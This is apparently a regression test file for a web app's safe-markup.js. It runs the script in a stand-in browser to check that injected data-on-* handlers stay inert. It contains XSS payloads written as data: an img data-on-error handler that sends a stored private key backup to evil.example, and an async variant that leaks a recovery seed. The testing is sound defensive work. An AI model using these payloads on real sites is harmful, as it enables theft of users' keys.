// Injected markup cannot run a handler (BUG-331, 2026-11-20). web/shared/safe-markup.js runs a
// page's data-on-* handlers under the site's script policy; a review proved, by running the real
// parser and runner, that it ran a data-on-* attribute on ANY element wherever it came from, so
// markup injected through an unescaped innerHTML write was live script again despite script-src
// 'self': <img src=x data-on-error="location.assign('https://evil.example/?k='.concat(
// localStorage.getItem('humanity_key_backup')))"> sent the stored key away with no click.
//
// Run: node --test scripts/tests/safe-markup-trust-web.test.js
//
// The real safe-markup.js runs as the FIRST script of a page in a small stand-in browser (below):
// elements, a document whose HTML parser can be driven step by step, innerHTML with the real
// rules that matter here (the first of two same-named attributes wins), a MutationObserver that
// delivers at the checkpoint, and events with capture, target and bubble phases. What it proves:
//  1. The review's two payloads, injected through innerHTML after the page loaded and while it was
//     still loading, do nothing (no navigation, no storage read), while the page's own static and
//     script-built (hosOn.attr) handlers still run.
//  2. An attribute changed or added on a page element after load does nothing new.
//  3. An attacker's data-on-click placed before the page's own in the same tag does nothing.
//  4. A handler the page did write still cannot reach the window, the document or storage, call
//     Object.assign (to write innerHTML), or start at a name the browser provides.
//
// SEEN RED (2026-11-20) against safe-markup.js before the fix (git show 28d1c3596:web/shared/
// safe-markup.js, run with HOS_WEB_DIR at a copy): 1 navigated to https://evil.example/?k={"publicKeyHex"
// ... after load and during load, and the async payload to https://evil.example/?s=7,7,7; 2 ran the
// replaced text and navigated; 3 ran the attacker's handler; 4 let Object.assign (and a page alias of
// it) write innerHTML, read storage through event.view and this.ownerDocument.defaultView, handed
// the document to a page function through a parentNode chain, and ran console.warn from markup.
// HOS_WEB_DIR points the tests at another copy of web/ (used to see each test red).

const { test } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const ROOT = path.join(__dirname, '..', '..');
const WEB = process.env.HOS_WEB_DIR || path.join(ROOT, 'web');
const SAFE_MARKUP = fs.readFileSync(path.join(WEB, 'shared', 'safe-markup.js'), 'utf8');

const KEY_BACKUP = '{"publicKeyHex":"ab","privateKeyPkcs8":"MC4CAQAwBQYDK2VwBCIEIAcHBwcH"}';
const PAYLOAD_SYNC = "location.assign('https://evil.example/?k='.concat(localStorage.getItem('humanity_key_backup')))";
const PAYLOAD_ASYNC = "getPqRecoverySeed().then(''.concat.bind('https://evil.example/?s=')).then(location.assign.bind(location))";
const htmlAttr = (s) => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
const injectedImg = (payload) => '<img src=x data-on-error="' + htmlAttr(payload) + '">';

// ── A small stand-in browser ─────────────────────────────────────────────
const VOID = new Set(['img', 'br', 'input', 'hr', 'meta', 'link']);
function decode(s) {
  return s.replace(/&(quot|#39|apos|lt|gt|amp);/g, (m, e) => ({ quot: '"', '#39': "'", apos: "'", lt: '<', gt: '>', amp: '&' })[e]);
}

function makeBrowser() {
  const observers = new Set();
  const errors = [];
  const warnings = [];
  const win = { _ls: [] };

  class Node {
    constructor() { this.childNodes = []; this.parentNode = null; this._ls = []; }
    get firstChild() { return this.childNodes[0] || null; }
    get ownerDocument() { return document; }
    addEventListener(type, fn, opt) { this._ls.push({ type, fn, capture: opt === true || !!(opt && opt.capture) }); }
    removeEventListener(type, fn) { this._ls = this._ls.filter((l) => l.type !== type || l.fn !== fn); }
    appendChild(n) { appendNode(this, n); enqueue(this, [n]); return n; }
    cloneNode() { throw new Error('not in this stand-in'); }
  }
  class Text extends Node { constructor(t) { super(); this.nodeType = 3; this.data = t; } }
  class Element extends Node {
    constructor(tag) { super(); this.nodeType = 1; this.localName = tag; this.attributes = []; }
    getAttribute(n) { const a = this.attributes.find((x) => x.name === n); return a ? a.value : null; }
    hasAttribute(n) { return this.attributes.some((x) => x.name === n); }
    setAttribute(n, v) { const a = this.attributes.find((x) => x.name === n); if (a) a.value = String(v); else this.attributes.push({ name: n, value: String(v) }); }
    removeAttribute(n) { this.attributes = this.attributes.filter((x) => x.name !== n); }
    get id() { return this.getAttribute('id') || ''; }
    insertAdjacentHTML(pos, html) {
      if (pos !== 'beforeend') throw new Error('only beforeend in this stand-in');
      const added = parseInto(new Element('div'), html, false).childNodes.slice();
      for (const n of added) appendNode(this, n);
      enqueue(this, added);
    }
  }
  Object.defineProperty(Element.prototype, 'innerHTML', {
    configurable: true,
    enumerable: true,
    get() { return serialize(this); },
    set(html) {
      for (const c of this.childNodes) c.parentNode = null;
      this.childNodes = [];
      const added = parseInto(new Element('div'), String(html), false).childNodes.slice();
      for (const n of added) appendNode(this, n);
      enqueue(this, added);
    },
  });
  class Document extends Node {
    constructor() { super(); this.nodeType = 9; this.readyState = 'loading'; }
    createElement(tag) { return new Element(String(tag).toLowerCase()); }
  }
  class MutationObserver {
    constructor(cb) { this.cb = cb; this.q = []; this.on = false; this.sched = false; observers.add(this); }
    observe() { this.on = true; }
    takeRecords() { const q = this.q; this.q = []; return q; }
    disconnect() { this.on = false; this.q = []; }
  }

  const document = new Document();
  function connected(n) { for (; n; n = n.parentNode) if (n === document) return true; return false; }
  function appendNode(parent, n) {
    if (n.parentNode) n.parentNode.childNodes.splice(n.parentNode.childNodes.indexOf(n), 1);
    n.parentNode = parent;
    parent.childNodes.push(n);
  }
  function enqueue(target, added) {
    if (!connected(target)) return;
    for (const o of observers) {
      if (!o.on) continue;
      o.q.push({ type: 'childList', target, addedNodes: added, removedNodes: [] });
      if (!o.sched) {
        o.sched = true;
        queueMicrotask(() => { o.sched = false; const q = o.takeRecords(); if (q.length && o.on) o.cb(q, o); });
      }
    }
  }
  // The HTML parser (no script reachable path: it makes elements with `new`, never through
  // document.createElement). `live` adds each node to a connected parent as it is made, as the
  // page's own parser does; otherwise the fragment is built detached, as innerHTML does.
  function parseInto(parent, html, live) {
    const stack = [parent];
    const re = /<!--[\s\S]*?-->|<\/([a-zA-Z][\w-]*)\s*>|<([a-zA-Z][\w-]*)((?:\s+[^\s\/>=]+(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+))?)*)\s*\/?>|([^<]+)/g;
    let m;
    const add = (n) => { const p = stack[stack.length - 1]; appendNode(p, n); if (live) enqueue(p, [n]); };
    while ((m = re.exec(html))) {
      if (m[1]) { const at = stack.map((e) => e.localName).lastIndexOf(m[1].toLowerCase()); if (at > 0) stack.length = at; continue; }
      if (m[4]) { add(new Text(decode(m[4]))); continue; }
      if (!m[2]) continue;
      const el = new Element(m[2].toLowerCase());
      const are = /([^\s\/>=]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+)))?/g;
      let a;
      while ((a = are.exec(m[3] || ''))) {
        const name = a[1].toLowerCase();
        if (el.hasAttribute(name)) continue; // the HTML parser keeps the FIRST of two same-named attributes
        el.attributes.push({ name, value: decode(a[2] ?? a[3] ?? a[4] ?? '') });
      }
      add(el);
      if (!VOID.has(el.localName)) stack.push(el);
    }
    return parent;
  }
  function serialize(el) {
    return el.childNodes.map((c) => c.nodeType === 3 ? c.data
      : '<' + c.localName + c.attributes.map((a) => ' ' + a.name + '="' + htmlAttr(a.value) + '"').join('') + '>' + serialize(c) + '</' + c.localName + '>').join('');
  }
  function find(id, from = document) {
    for (const c of from.childNodes) {
      if (c.nodeType === 1 && c.getAttribute('id') === id) return c;
      const r = c.childNodes ? find(id, c) : null;
      if (r) return r;
    }
    return null;
  }
  function dispatch(target, type, init = {}) {
    const pathList = [];
    for (let n = target; n; n = n.parentNode) pathList.push(n);
    pathList.push(win);
    const ev = {
      type, target, bubbles: !!init.bubbles, key: init.key, currentTarget: null, view: win, _stop: false,
      composedPath() { return pathList.slice(); }, stopPropagation() { this._stop = true; }, preventDefault() {},
    };
    const invoke = (node, phase) => {
      ev.currentTarget = node;
      for (const l of node._ls.slice()) {
        if (l.type !== type || (phase === 'capture' && !l.capture) || (phase === 'bubble' && l.capture)) continue;
        try { l.fn.call(node, ev); } catch (e) { errors.push(e); }
      }
    };
    for (let i = pathList.length - 1; i >= 1 && !ev._stop; i--) invoke(pathList[i], 'capture');
    if (!ev._stop) invoke(target, 'target');
    if (ev.bubbles) for (let i = 1; i < pathList.length && !ev._stop; i++) invoke(pathList[i], 'bubble');
    return ev;
  }

  const html = new Element('html');
  const head = new Element('head');
  appendNode(document, html);
  appendNode(html, head);
  win.addEventListener = Node.prototype.addEventListener;
  win.removeEventListener = Node.prototype.removeEventListener;
  const navigated = [];
  const storageReads = [];
  const ctx = vm.createContext(Object.assign(win, {
    document,
    location: { assign(u) { navigated.push(String(u)); } },
    localStorage: { getItem(k) { storageReads.push(k); return k === 'humanity_key_backup' ? KEY_BACKUP : null; } },
    console: { warn: (...a) => warnings.push(a.join(' ')), error: (...a) => warnings.push(a.join(' ')), log() {} },
    crypto: globalThis.crypto,
    MutationObserver, Node, Element, Document, Text,
  }));
  win.window = ctx;
  document.defaultView = ctx;
  const flush = () => new Promise((r) => setImmediate(r));
  const B = {
    ctx, document, navigated, storageReads, errors, warnings, find, dispatch, flush,
    // The page's first script: safe-markup.js, in the <head>.
    loadSafeMarkup() { vm.runInContext(SAFE_MARKUP, ctx, { filename: 'safe-markup.js' }); },
    // A later page script (its top-level functions land on window, as a classic script's do).
    script(src) { return vm.runInContext(src, ctx); },
    // The page's own HTML parser adds markup to <body> (made on first use), node by node.
    async parse(markup) {
      let body = find('body') || document.childNodes[0].childNodes.find((c) => c.localName === 'body');
      if (!body) { body = new Element('body'); appendNode(html, body); enqueue(html, [body]); }
      parseInto(body, markup, true);
      await flush(); // the checkpoint before the next script
    },
    async finishParsing() {
      document.readyState = 'interactive';
      dispatch(document, 'readystatechange');
      await flush();
    },
    click(id) { const el = find(id); assert.ok(el, 'no #' + id); return dispatch(el, 'click', { bubbles: true }); },
  };
  return B;
}

// A page with one static handler and the functions it names; returns the browser once loaded.
async function standardPage(opts = {}) {
  const B = makeBrowser();
  B.loadSafeMarkup();
  B.script(`
    var calls = [];
    function openNote(id) { calls.push('openNote:' + id); }
    function getPqRecoverySeed() { calls.push('seed read'); return Promise.resolve(new Uint8Array([7, 7, 7])); }
    function attrOf(type, text) { return hosOn.attr ? hosOn.attr(type, text) : 'data-on-' + type + '="' + text.replace(/"/g, '&quot;') + '"'; }
  `);
  await B.parse('<main id="app"><button id="static1" data-on-click="openNote(\'static1\')">Open</button><div id="list"></div><div id="room"></div></main>');
  if (opts.duringLoad) { opts.duringLoad(B); await B.flush(); }
  await B.finishParsing();
  return B;
}
// (JSON across the boundary: the page's arrays are another realm's.)
const callsOf = (B) => JSON.parse(B.script('JSON.stringify(calls)'));

// ── 1. the review's payloads ─────────────────────────────────────────────
test('the review\'s payloads injected after load do nothing, and the page\'s own handlers still run', async () => {
  const B = await standardPage();
  // A voice room named with markup, written unescaped (chat-voice-rooms.js before this fix).
  B.find('room').innerHTML = 'Connected to: ' + injectedImg(PAYLOAD_SYNC) + injectedImg(PAYLOAD_ASYNC);
  for (const img of B.find('room').childNodes.filter((n) => n.localName === 'img')) B.dispatch(img, 'error'); // the image fails to load
  await B.flush();
  await B.flush();
  assert.deepStrictEqual(B.navigated, [], 'no navigation from injected markup');
  assert.deepStrictEqual(B.storageReads, [], 'no storage read from injected markup');
  assert.ok(!callsOf(B).includes('seed read'), 'the recovery seed was not asked for');
  // The page's own handlers: the static one, and one built in script with hosOn.attr.
  B.click('static1');
  B.find('list').innerHTML = '<button id="built1" ' + B.script('attrOf("click", "openNote(" + hosArg("n1") + ")")') + '>Open</button>';
  B.click('built1');
  assert.deepStrictEqual(callsOf(B), ['openNote:static1', 'openNote:n1']);
  assert.ok(B.warnings.some((w) => /did not write/.test(w)), 'the ignored handler is reported once for development');
});

test('the payloads injected while the page is still loading are not taken for static HTML', async () => {
  const B = await standardPage({
    duringLoad(b) { b.find('list').innerHTML = injectedImg(PAYLOAD_SYNC); },
  });
  const img = B.find('list').childNodes[0];
  B.dispatch(img, 'error');
  await B.flush();
  assert.deepStrictEqual(B.navigated, [], 'markup a script wrote during load is not the page\'s static HTML');
  B.click('static1');
  assert.deepStrictEqual(callsOf(B), ['openNote:static1'], 'the page\'s own static handler still runs');
});

test('a static element the parser makes after a script ran during load is still the page\'s', async () => {
  const B = makeBrowser();
  B.loadSafeMarkup();
  B.script('var calls = []; function openNote(id) { calls.push("openNote:" + id); }');
  await B.parse('<div id="list"></div>');
  B.find('list').innerHTML = injectedImg(PAYLOAD_SYNC); // a script runs mid-page
  await B.flush();
  await B.parse('<button id="after" data-on-click="openNote(\'after\')">x</button>');
  await B.finishParsing();
  B.click('after');
  B.dispatch(B.find('list').childNodes[0], 'error');
  assert.deepStrictEqual(callsOf(B), ['openNote:after']);
  assert.deepStrictEqual(B.navigated, []);
});

// ── 2. attributes changed later ──────────────────────────────────────────
test('an attribute changed or added on a page element after load does nothing new', async () => {
  const B = await standardPage();
  const btn = B.find('static1');
  btn.setAttribute('data-on-click', PAYLOAD_SYNC);
  btn.setAttribute('data-on-mouseover', PAYLOAD_SYNC);
  B.click('static1');
  B.dispatch(btn, 'mouseover', { bubbles: true });
  assert.deepStrictEqual(B.navigated, [], 'the live attribute is never the handler of a page element');
  assert.deepStrictEqual(callsOf(B), ['openNote:static1'], 'the text recorded from the page ran');
  // Removing the attribute still turns the handler off (chat-onboarding.js relies on it).
  btn.removeAttribute('data-on-click');
  B.click('static1');
  assert.deepStrictEqual(callsOf(B), ['openNote:static1']);
});

// ── 3. duplicate attributes ──────────────────────────────────────────────
test('an attacker\'s data-on-click placed before the page\'s own in the same tag does nothing', async () => {
  const B = await standardPage();
  const name = 'x" data-on-click="' + PAYLOAD_SYNC.replace(/"/g, '') + '" data-z="';
  // A title written without escaping, then the page's own handler: the parser keeps the first.
  B.find('list').innerHTML = '<div id="dup" title="' + name + '" ' + B.script('attrOf("click", "openNote(\'dup\')")') + '>row</div>';
  B.click('dup');
  assert.deepStrictEqual(B.navigated, []);
  assert.deepStrictEqual(callsOf(B), [], 'the attacker\'s attribute is not a token of this page, so nothing ran');
});

// ── 4. what a handler the page wrote can reach ───────────────────────────
test('a handler the page wrote cannot reach the window, the document or storage, nor write markup', async () => {
  const tries = {
    viaAssign: "Object.assign(this, {innerHTML: '<b>x</b>'})",
    viaAlias: "assignIt(this, {innerHTML: '<b>x</b>'})",
    viaView: "note(event.view.localStorage.getItem('humanity_key_backup'))",
    viaOwner: "note(this.ownerDocument.defaultView.localStorage.getItem('humanity_key_backup'))",
    viaParents: "note(this.parentNode.parentNode.parentNode)",
    viaBuiltin: "console.warn('from markup')",
    viaSet: "hosOn.set(this, 'innerHTML', '<b>x</b>')",
  };
  // Each in a page of its own: the ones that got through, and what they did.
  const through = [];
  for (const [id, h] of Object.entries(tries)) {
    const B = makeBrowser();
    B.loadSafeMarkup();
    B.script('var calls = []; var assignIt = Object.assign; function note(x) { calls.push(x); }');
    await B.parse('<button id="' + id + '" data-on-click="' + htmlAttr(h) + '">x</button>');
    await B.finishParsing();
    B.click(id);
    const did = [];
    if (B.find(id).innerHTML !== 'x') did.push('wrote markup');
    if (B.storageReads.length) did.push('read storage');
    if (B.script('calls.length')) did.push('handed a value to the page');
    if (B.warnings.includes('from markup')) did.push('called console');
    if (did.length) through.push(id + ': ' + did.join(', '));
  }
  assert.deepStrictEqual(through, [], 'nothing reached the window, the document, storage or markup');
});

// ── the stand-in itself ──────────────────────────────────────────────────
test('the stand-in browser parses and dispatches as these tests need', async () => {
  const B = makeBrowser();
  await B.parse('<p id="p" title="a" title="b" data-x=\'q\'>t<b>u</b></p>');
  const p = B.find('p');
  assert.strictEqual(p.getAttribute('title'), 'a', 'the first of two same-named attributes wins');
  assert.strictEqual(p.getAttribute('data-x'), 'q');
  const seen = [];
  B.document.addEventListener('error', (e) => seen.push('capture:' + e.target.id), true);
  p.addEventListener('error', () => seen.push('target'));
  B.document.addEventListener('error', () => seen.push('bubble'));
  B.dispatch(p, 'error');
  assert.deepStrictEqual(seen, ['capture:p', 'target'], 'a non-bubbling event still passes the capture phase');
});
